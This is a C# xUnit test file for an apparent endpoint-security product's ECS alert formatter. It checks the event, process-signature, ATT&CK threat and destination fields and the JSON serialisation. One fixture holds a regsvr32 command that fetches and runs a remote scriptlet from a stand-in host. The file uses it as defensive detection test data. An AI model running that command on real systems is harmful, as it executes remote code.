using System.Collections.Generic;
using System.Text.Json;
using Bulwark.Core.Engine;
using Bulwark.Core.Models;
using Xunit;

namespace Bulwark.Core.Tests;

/// <summary>
/// ECS 结构化告警格式化:验证关键 ECS 字段、ATT&CK threat 映射、网络 destination、
/// 签名状态与证据链扩展字段,并确保可被 System.Text.Json 序列化为合法 JSON。
/// </summary>
public class EcsAlertFormatterTests
{
    private static SecurityEvent BuildBlockedLolbinEvent()
    {
        var engine = new RuleEngine { TrustSignedActors = true };
        var e = new SecurityEvent
        {
            Type = EventType.ProcessCreate,
            ActorPath = @"C:\Windows\System32\regsvr32.exe",
            ActorPid = 4242,
            ActorSigned = true,
            ActorPublisher = "Microsoft Corporation",
            CommandLine = "regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll"
        };
        engine.Evaluate(e); // 触发 LOLBin 硬指标 + ATT&CK 标注
        return e;
    }

    [Fact]
    public void Format_ProducesCoreEcsFields()
    {
        var e = BuildBlockedLolbinEvent();
        var v = Verdict.For(e, VerdictAction.Block, VerdictSource.Heuristic);

        var doc = EcsAlertFormatter.Format(e, v);

        Assert.True(doc.ContainsKey("@timestamp"));
        var ev = Assert.IsType<Dictionary<string, object?>>(doc["event"]);
        Assert.Equal("blocked", ev["action"]);
        Assert.Equal("alert", ev["kind"]);

        var proc = Assert.IsType<Dictionary<string, object?>>(doc["process"]);
        Assert.Equal(4242, proc["pid"]);
        var sig = Assert.IsType<Dictionary<string, object?>>(proc["code_signature"]);
        Assert.Equal(true, sig["exists"]);
    }

    [Fact]
    public void Format_IncludesAttackThreatBlock()
    {
        var e = BuildBlockedLolbinEvent();
        var v = Verdict.For(e, VerdictAction.Block, VerdictSource.Heuristic);

        var doc = EcsAlertFormatter.Format(e, v);

        Assert.True(doc.ContainsKey("threat"));
        var threat = Assert.IsType<Dictionary<string, object?>>(doc["threat"]);
        var techniques = Assert.IsType<List<object>>(threat["technique"]);
        Assert.NotEmpty(techniques);
        var first = Assert.IsType<Dictionary<string, object?>>(techniques[0]);
        Assert.NotNull(first["id"]);
        Assert.NotNull(first["name"]);
    }

    [Fact]
    public void Format_NetworkEvent_AddsDestination()
    {
        var e = new SecurityEvent
        {
            Type = EventType.NetworkConnect,
            ActorPath = @"C:\app\x.exe",
            Target = "203.0.113.5:443"
        };
        var v = Verdict.For(e, VerdictAction.Allow, VerdictSource.DefaultPolicy);

        var doc = EcsAlertFormatter.Format(e, v);

        var dest = Assert.IsType<Dictionary<string, object?>>(doc["destination"]);
        Assert.Equal("203.0.113.5", dest["address"]);
        Assert.Equal(443, dest["port"]);
        Assert.Equal("203.0.113.5", dest["ip"]);
    }

    [Fact]
    public void Format_IsSerializableJson()
    {
        var e = BuildBlockedLolbinEvent();
        var v = Verdict.For(e, VerdictAction.Block, VerdictSource.Heuristic);

        var doc = EcsAlertFormatter.Format(e, v);
        var json = JsonSerializer.Serialize(doc);

        Assert.Contains("\"@timestamp\"", json);
        Assert.Contains("\"threat\"", json);
        Assert.Contains("\"technique\"", json);
        // 证据链扩展字段
        Assert.Contains("\"bulwark\"", json);
        using var parsed = JsonDocument.Parse(json); // 不抛即为合法 JSON
    }
}
